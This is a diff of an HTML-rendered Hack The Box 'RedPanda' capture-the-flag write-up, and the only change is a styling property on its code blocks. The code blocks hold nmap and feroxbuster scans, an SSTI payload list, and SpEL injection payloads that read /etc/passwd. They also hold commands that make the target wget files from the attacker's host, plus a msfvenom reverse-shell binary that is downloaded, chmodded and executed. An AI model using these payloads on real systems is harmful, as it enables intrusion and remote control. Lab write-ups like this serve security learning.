@@ -224,7 +224,7 @@
 <li><strong>Basic TCP Scan</strong>:
 <ul>
 <li><code>nmap $box -Pn -oA TCPbasicScan</code>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
 </span></span><span style="display:flex;"><span>🕙 15:17:33 zsh ❯ nmap $box -oA TCPbasicScan
 </span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-12-27 15:17 GMT
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.207
@@ -249,7 +249,7 @@
 <li><strong>In depth scan TCP</strong>:
 <ul>
 <li><code>sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP</code>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
 </span></span><span style="display:flex;"><span>  🕙 15:19:23 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP
 </span></span><span style="display:flex;"><span>  [sudo] password for kali:
 </span></span><span style="display:flex;"><span>  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 15:19 GMT
@@ -415,7 +415,7 @@
 </ul>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>  kali in HTB/BlogEntriesMade/RedPanda/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
 </span></span><span style="display:flex;"><span>🕙 15:34:26 zsh ❯ feroxbuster -u http://$box:8080 --threads <span style="color:#ae81ff">20</span> --scan-limit <span style="color:#ae81ff">2</span> -q -r -o $domain-FeroxScan.txt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       22l       41w      295c http://10.129.227.207:8080/css/main.css
@@ -559,7 +559,7 @@
 <ul>
 <li><strong>Same content as a list for fuzzing</strong>:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>${7*7}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>${7*7}
 </span></span><span style="display:flex;"><span>a{*comment*}b
 </span></span><span style="display:flex;"><span>${&#34;&#34;.join(&#34;ab&#34;)}
 </span></span><span style="display:flex;"><span>{{7*7}}
@@ -648,7 +648,7 @@
 <ul>
 <li>Using the below shell code we can create a list of special chars called <code>specialChars.txt</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span>i<span style="color:#f92672">=</span>32; i&lt;127; i++<span style="color:#f92672">))</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf %03o <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span> <span style="color:#f92672">=</span>~ <span style="color:#f92672">[[</span>:punct:<span style="color:#f92672">]]</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf %03o <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">\n&#34;</span>; <span style="color:#66d9ef">done</span> &gt; specialChars.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span>i<span style="color:#f92672">=</span>32; i&lt;127; i++<span style="color:#f92672">))</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf %03o <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span> <span style="color:#f92672">=</span>~ <span style="color:#f92672">[[</span>:punct:<span style="color:#f92672">]]</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> printf <span style="color:#e6db74">&#34;\\</span><span style="color:#66d9ef">$(</span>printf %03o <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">\n&#34;</span>; <span style="color:#66d9ef">done</span> &gt; specialChars.txt
 </span></span></code></pre></div><h5 id="fuzzing-for-banned-chars-using-ffuf">Fuzzing for banned chars using FFUF:</h5>
 <ul>
 <li>
@@ -663,14 +663,14 @@
 </ul>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl --path-as-is -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>curl --path-as-is -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">$&#39;Host: 10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 71&#39;</span> -H <span style="color:#e6db74">$&#39;Cache-Control: max-age=0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://10.129.227.207:8080/search&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>    --data-binary <span style="color:#e6db74">$&#39;name=%24%7B%27patt%27.toString%28%29.replace%28%27a%27%2C+%27x%27%29%7D&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>    <span style="color:#e6db74">$&#39;http://10.129.227.207:8080/search&#39;</span>
 </span></span></code></pre></div><ul>
 <li>I then modify it to the below so it can be used with FFUF.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -u <span style="color:#e6db74">$&#39;http://10.129.227.207:8080/search&#39;</span> -w ./specialChars.txt  -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ffuf -u <span style="color:#e6db74">$&#39;http://10.129.227.207:8080/search&#39;</span> -w ./specialChars.txt  -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">$&#39;Host: 10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Length: 71&#39;</span> -H <span style="color:#e6db74">$&#39;Cache-Control: max-age=0&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> -H <span style="color:#e6db74">$&#39;Origin: http://10.129.227.207:8080&#39;</span> -H <span style="color:#e6db74">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span style="color:#e6db74">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36&#39;</span> -H <span style="color:#e6db74">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#39;</span> -H <span style="color:#e6db74">$&#39;Referer: http://10.129.227.207:8080/search&#39;</span> -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> <span style="color:#ae81ff">\
 </span></span></span><span style="display:flex;"><span>    --data-binary <span style="color:#e6db74">$&#39;name=FUZZ&#39;</span> -x http://127.0.0.1:8080
 </span></span></code></pre></div><ul>
@@ -728,7 +728,7 @@
 <li>
 <p>Looking at the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#spel---basic-injection"  target="_blank" rel="noreferrer nofollow">Payload All The Things java section</a>
  there is this command for reading <code>/etc/passwd</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e6db74">${</span>T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())<span style="color:#e6db74">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#e6db74">${</span>T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())<span style="color:#e6db74">}</span>
 </span></span></code></pre></div><ul>
 <li>
 <p>It begins with a <code>$</code> which is a banned character, but looking at the page I can see the following line.</p>
@@ -745,7 +745,7 @@
 </li>
 <li>
 <p>I modify the command to be:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>org.apache.commons.io.IOUtils<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Runtime<span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>99<span style="color:#f92672">)</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>97<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>116<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>32<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>47<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>101<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>116<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>99<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>47<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>112<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>97<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>115<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>115<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>119<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>100<span style="color:#f92672">)))</span>.getInputStream<span style="color:#f92672">())}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span>T<span style="color:#f92672">(</span>org.apache.commons.io.IOUtils<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Runtime<span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>99<span style="color:#f92672">)</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>97<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>116<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>32<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>47<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>101<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>116<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>99<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>47<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>112<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>97<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>115<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>115<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>119<span style="color:#f92672">))</span>.concat<span style="color:#f92672">(</span>T<span style="color:#f92672">(</span>java.lang.Character<span style="color:#f92672">)</span>.toString<span style="color:#f92672">(</span>100<span style="color:#f92672">)))</span>.getInputStream<span style="color:#f92672">())}</span>
 </span></span></code></pre></div><ul>
 <li>It works &amp; I can read the <code>/etc/passwd</code> file</li>
 <li><figure><img src="/ox-hugo/2025-01-03-172858_.png">
@@ -758,7 +758,7 @@
 <ul>
 <li>
 <p>I the below commands.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">*</span>{T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Runtime</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;whoami&#34;</span>)}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">*</span>{T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Runtime</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;whoami&#34;</span>)}
 </span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>{T(java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Runtime</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c whoami&#34;</span>)}
 </span></span></code></pre></div><ul>
 <li>I get this response:
@@ -778,7 +778,7 @@
 <ul>
 <li><code>python -m http.server 9000</code></li>
 <li>I then have the application reach out to the webserver to make a wget request.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#f92672">*</span>{<span style="color:#e6db74">&#34;&#34;</span>.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;wget http://10.10.14.89:9000/POC&#34;</span>)}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#f92672">*</span>{<span style="color:#e6db74">&#34;&#34;</span>.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;wget http://10.10.14.89:9000/POC&#34;</span>)}
 </span></span></code></pre></div></li>
 <li>Just as I thought it makes a request to my host.
 <ul>
@@ -803,7 +803,7 @@
 </ul>
 <h3 id="getting-a-reverse-shell-via-ssti">Getting A Reverse Shell VIA SSTI:</h3>
 <h4 id="creating-a-malicious-dot-elf-binary">Creating A Malicious <code>.elf</code> binary:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.89 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span> -f elf &gt; rev.elf
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.89 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4242</span> -f elf &gt; rev.elf
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-01-03-175837_.png">
 </figure>
@@ -819,7 +819,7 @@
 </li>
 <li>
 <p>On the target I use wget to copy the file:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wget http://10.10.14.89:9000/rev.elf&#34;</span><span style="color:#f92672">)}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wget http://10.10.14.89:9000/rev.elf&#34;</span><span style="color:#f92672">)}</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-01-03-180127_.png">
 </figure>
@@ -829,12 +829,12 @@
 </li>
 </ul>
 <h4 id="making-the-malicious-binary-executable">Making The Malicious Binary Executable:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 777 ./rev.elf&#34;</span><span style="color:#f92672">)}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 777 ./rev.elf&#34;</span><span style="color:#f92672">)}</span>
 </span></span></code></pre></div><ul>
 <li>There is no feedback from this, I am running this blind.</li>
 </ul>
 <h4 id="executing-the-malicious-dot-elf-and-getting-a-shell">Executing The Malicious <code>.elf</code> &amp; Getting A Shell:</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./rev.elf&#34;</span><span style="color:#f92672">)}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>*<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;&#34;</span>.getClass<span style="color:#f92672">()</span>.forName<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span><span style="color:#f92672">)</span>.getRuntime<span style="color:#f92672">()</span>.exec<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./rev.elf&#34;</span><span style="color:#f92672">)}</span>
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-01-03-180247_.png">
 </figure>
@@ -885,7 +885,7 @@
 </li>
 <li>
 <p>I check if the user can write to any log files. I do this because if the user can write to a log file I may be able to use the logrotten exploit to escalate privileges.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#34;*.log&#34;</span> -writable 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>find / -type f -name <span style="color:#e6db74">&#34;*.log&#34;</span> -writable 2&gt;/dev/null
